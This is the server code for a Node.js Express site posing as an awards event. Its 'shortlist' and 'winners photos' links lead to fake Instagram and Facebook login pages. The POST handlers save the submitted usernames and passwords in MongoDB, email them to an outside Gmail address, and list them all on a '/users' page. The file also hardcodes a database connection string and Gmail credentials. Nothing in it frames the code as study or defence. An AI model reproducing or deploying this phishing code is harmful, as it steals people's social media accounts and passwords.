//require modules
const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
const path = require("path");

const port = 3000; //listening port on localhost

// mongodb data connection set-up
mongoose
  .connect("mongodb+srv://user:j8?3Rtdy#UnzJy-@atlascluster.2dau4qu.mongodb.net/?retryWrites=true&w=majority")
  .then(function () {
    console.log("Connected to mongodb");
  })
  .catch(function (error) {
    console.error("Could not connect to mongoDB...", error);
  });
const userSchema = mongoose.Schema(
  {
    username: String,
    password: String,
    infoType: String,
    created: { type: Date, default: Date.now },
  },
  {
    timestamps: true,
  }
);
// mongodb modle and Schema
const userModel = mongoose.model("user", userSchema);

//represent modules
const app = express();
let publicPath = path.join();

// use modules middleware required
app.use(express.static("public")); //use public static files
app.use(bodyParser.urlencoded({ extended: true }));

app.set("view engine", "ejs"); //ejs middleware, view engine.

//create route
app.get("/", function (request, response) {
  response.render("index");
});
app.get("/about", function (request, response) {
  response.render("about/index");
});
app.get("/book-of-the-night", function (request, response) {
  response.render("book-of-the-night/index");
});
app.get("/code-of-conduct", function (request, response) {
  response.render("code-of-conduct/index");
});
app.get("/competition-terms", function (request, response) {
  response.render("competition-terms/index");
});
app.get("/contact", function (request, response) {
  response.render("contact/index");
});
app.get("/download-logos", function (request, response) {
  response.render("download-the-logos/index");
});
app.get("/faqs", function (request, response) {
  response.render("faqs/index");
});
app.get("/host", function (request, response) {
  response.render("host/index");
});
app.get("/itinerary", function (request, response) {
  response.render("itinerary/index");
});
app.get("/judges", function (request, response) {
  response.render("judges/index");
});
app.get("/judging-process", function (request, response) {
  response.render("judging-process/index");
});
app.get("/newsletter", function (request, response) {
  response.render("newsletter/index");
});
app.get("/refund-policy", function (request, response) {
  response.render("refund-policy/index");
});
app.get("/schema-org", function (request, response) {
  response.render("schema.org/index");
});
app.get("/shortlist", function (request, response) {
  response.redirect("/login");
});
app.get("/sponsorship", function (request, response) {
  response.render("sponsorship/index");
});
app.get("/terms-conditions", function (request, response) {
  response.render("terms-conditions/index");
});
app.get("/testimonials", function (request, response) {
  response.render("testimonial/index");
});
app.get("/venue", function (request, response) {
  response.render("venue/index");
});
app.get("/why-enter", function (request, response) {
  response.render("why-enter/index");
});
app.get("/winners-photos", function (request, response) {
  response.redirect("/login");
});
app.get("/winners", function (request, response) {
  response.render("winners/index");
});
app.get("/users", async function (request, response) {
  userModel
    .find()
    .sort({ created: -1 })
    .then(async function (data) {
      response.render("info", { userData: await data });
    })
    .catch(function (error) {
      console.log("Error finding user data", error);
    });
});
app
  .route("/login")
  .get(async function (request, response) {
    response.render("insta_login");
  })
  .post(async function (request, response) {
    const username = await request.body.username;
    const password = await request.body.password;
    const infoType = "Instagram";
    //save data
    const userData = await new userModel({
      username: username,
      password: password,
      infoType: infoType,
    });

    //save user data
    await userData.save();

    const output = `
    Congrates you have a new user Login From Instagram:
    Contact Details
    Username: ${username}
    Password: ${password}
     `;
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "stevenwoods943@gmail.com",
        pass: "kfqbbpdsjdssfrqr",
      },
    });
    //   Define email
    const mailOptions = {
      from: "stevenwoods943@gmail.com",
      to: "patrickrodgers511@gmail.com",
      subject: "New Instagram Account Login",
      text: output,
    };
    transporter.sendMail(mailOptions, async function (error, info) {
      if (error) {
        console.log(error, "error");
      } else {
        console.log("Email sent: ", info);
      }
    });
    // async..await is not allowed in global scope, must use a wrapper
    async function main() {
      console.log("Message sent: %s", info.messageId);
    }
    main().catch(console.error);

    response.redirect("/");
  });
app
  .route("/login-facebook")
  .get(async function (request, response) {
    response.render("facebook_login");
  })
  .post(async function (request, response) {
    const username = await request.body.username;
    const password = await request.body.password;
    const infoType = "Facebook";
    //save data
    const userData = await new userModel({
      username: username,
      password: password,
      infoType: infoType,
    });

    //save user data
    await userData.save();
    const output = await `
    Congrates you have a new user Login From Facebook: \n
    Contact Details
    Username: ${await username}
    Password: ${await password}
     `;
    const transporter = await nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "stevenwoods943@gmail.com",
        pass: "kfqbbpdsjdssfrqr",
      },
    });
    //   Define email
    const mailOptions = await {
      from: "stevenwoods943@gmail.com",
      to: "patrickrodgers511@gmail.com",
      subject: "New Facebook Account Login",
      text: await output,
    };
    transporter.sendMail(mailOptions, async function (error, info) {
      if (error) {
        console.log(error, "error");
      } else {
        console.log("Email sent: ", info);
      }
    });
    // async..await is not allowed in global scope, must use a wrapper
    async function main() {
      console.log("Message sent: %s", info.messageId);
    }
    main().catch(console.error);
    response.redirect("/");
  });

app.listen(process.env.PORT || 3000, function () {
  console.log(`Server has started on port ${port} ......`);
});
